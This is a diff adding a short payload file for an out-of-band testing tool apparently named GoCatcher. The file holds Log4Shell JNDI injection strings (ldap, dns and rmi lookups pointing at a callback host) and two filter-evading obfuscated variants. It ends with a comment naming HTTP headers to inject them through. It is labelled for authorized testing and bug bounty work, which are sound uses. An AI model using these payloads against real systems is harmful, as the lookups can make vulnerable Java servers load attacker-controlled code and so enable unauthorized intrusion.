@@ -1,0 +1,11 @@
+===========================================================================
+ GoCatcher :: Log4Shell / JNDI test payloads  (text/plain)
+ FOR AUTHORIZED TESTING / CTF / BUG BOUNTY ONLY.
+ Point the JNDI host at your GoCatcher DNS/HTTP listener ({{callback_url}}).
+===========================================================================
+${jndi:ldap://{{callback_url}}/log4shell}
+${jndi:dns://{{callback_url}}/l4j}
+${jndi:rmi://{{callback_url}}/log4shell}
+${${lower:j}ndi:${lower:l}${lower:d}ap://{{callback_url}}/bypass}
+${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://{{callback_url}}/x}
+# Inject via headers: User-Agent, X-Forwarded-For, Referer, etc.
